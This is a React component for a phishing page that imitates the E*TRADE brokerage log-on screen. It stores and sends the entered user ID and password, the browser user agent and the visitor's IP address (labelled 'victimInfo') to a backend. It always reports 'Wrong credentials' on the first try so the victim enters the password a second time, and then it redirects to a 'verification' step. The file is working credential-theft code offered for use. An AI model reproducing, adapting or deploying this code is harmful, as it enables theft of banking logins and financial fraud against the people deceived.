import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import { IoIosInformationCircleOutline } from "react-icons/io";
import { IoEyeOffOutline, IoEyeOff } from "react-icons/io5";
import FormLayout from "../components/formLayout";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import Input from "../components/input";
import Button from "../components/button";
import API from "../api/api";
import { IoIosLock } from "react-icons/io";
import axios from "axios";
import { FaArrowRight } from "react-icons/fa";

const Login = () => {
  const router = useHistory();
  const [data, setData] = useState({ userID: "", password: "" });
  const [isWrong, setIsWrong] = useState(false);
  const [isShowPass, setIsShowPass] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    sessionStorage.setItem(APP_STORAGE_NAME, JSON.stringify(data));
    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ..._data,
        bank: "E*TRADE",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        if (!isWrong) {
          setData({ userID: "", password: "" });
          setIsWrong(true);
          return;
        }
        router.push(`/verification?${randParams()}`);
      }
    } catch (error) {
      alert("Something went wrong");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  return (
    <>
      <FormLayout
        handleSubmit={handleSubmit}
        title="Log on"
      >
        <Input
          title="User ID"
          name="userID"
          value={data?.userID}
          onChange={handleChange}
        />
        <Input
          title="Password"
          type={!isShowPass ? "password" : "text"}
          name="password"
          value={data?.password}
          onChange={handleChange}
        >
          <span
            className="absolute top-1 right-0 text-[#5627d8] text-[13px] flex items-center gap-2"
            onClick={() => setIsShowPass((prev) => !prev)}
          >
            {!isShowPass ? (
              <IoEyeOff
                fontSize={19}
                fill="#5627d8"
              />
            ) : (
              <IoEyeOffOutline
                fontSize={19}
                fill="#5627d8"
              />
            )}{" "}
            Show
          </span>
        </Input>
        <div className="flex md:items-center md:justify-between max-md:gap-4 max-md:flex-wrap max-md:flex-col">
          <div className="flex gap-2 items-center">
            <input
              id="checkbox"
              type="checkbox"
              className="border-[1px] size-4"
            />
            <label
              htmlFor="checkbox"
              className="text-[13px]"
            >
              Remember User ID
            </label>
          </div>
          <div className="flex gap-2 items-center">
            <input
              id="checkbox"
              type="checkbox"
              className="border-[1px] size-4"
            />
            <label
              htmlFor="checkbox"
              className="text-[13px]"
            >
              Use security code
            </label>
            <IoIosInformationCircleOutline
              fontSize={18}
              fill="#5627d8"
            />
          </div>
        </div>

        {isWrong && (
          <div
            role="alert"
            className="mt-3 alert alert-error my-4 rounded-lg bg-[#fcf3f3] border-[#fcf3f3] text-[#333333]"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              className="stroke-[#ce1616] shrink-0 w-6 h-6"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
              ></path>
            </svg>
            <span>Wrong credentials.</span>
          </div>
        )}

        <p className="mt-4 text-sm mb-1">Go To:</p>
        <div className="flex items-center gap-4 max-md:flex-wrap max-md:flex-col justify-between">
          <select className="pl-2 py-[5px] focus:border-[#5627d8] hover:border-[#5627d8] border border-[#b1b1b1] w-full text-sm">
            <option>Accounts</option>
            <option>Portfolios</option>
            <option>Stock Trade</option>
            <option>Options Trade</option>
            <option>Markets</option>
            <option>Bank Accounts</option>
            <option>Bill Pay</option>
            <option>At Work</option>
          </select>
          <Button
            style={{ margin: 0 }}
            title={
              isLoading ? (
                <span className="loading loading-spinner loading-md text-white"></span>
              ) : (
                "Log on"
              )
            }
          />
        </div>

        <div className="flex items-center gap-1 text-sm mt-3">
          Forgot
          <a
            href="#"
            className="text-[#5627d8] text-sm font-[500]"
          >
            User ID
          </a>
          or
          <a
            href="#"
            className="text-[#5627d8] text-sm font-[500]"
          >
            Password
          </a>
        </div>

        <p className="text-[#5627d8] my-4 text-sm">
          Need more help logging on?
        </p>
        <p className="text-[#5627d8] my-4 text-sm flex gap-1 items-center">
          <IoIosLock
            size={18}
            fill="#5627d8"
          />
          Security center?
        </p>
      </FormLayout>

      {/* Card  */}
      <div className="flex gap-2 flex-wrap">
        <div className="max-md:w-full md:flex-1 border border-[#e4e4e4] m-[10px] p-7">
          <p className="font-semibold mb-1">More advantages for you</p>
          <p className="text-sm mb-1">
            Explore products and resources now that E*TRADE and Morgan Stanley
            have joined forces
          </p>
          <p className="flex items-center">
            <span className="text-sm text-[#5627d8] pr-1">See what's new</span>
            <FaArrowRight
              size={16}
              fill="#5627d8"
            />
          </p>
        </div>
        <div className="max-md:w-full md:flex-1 border border-[#e4e4e4] m-[10px] p-7">
          <p className="font-semibold mb-1">
            Need tax documents for a closed account?
          </p>
          <p className="text-sm mb-1">
            Log on above with your old user ID and password
          </p>
        </div>
      </div>
    </>
  );
};

export default Login;
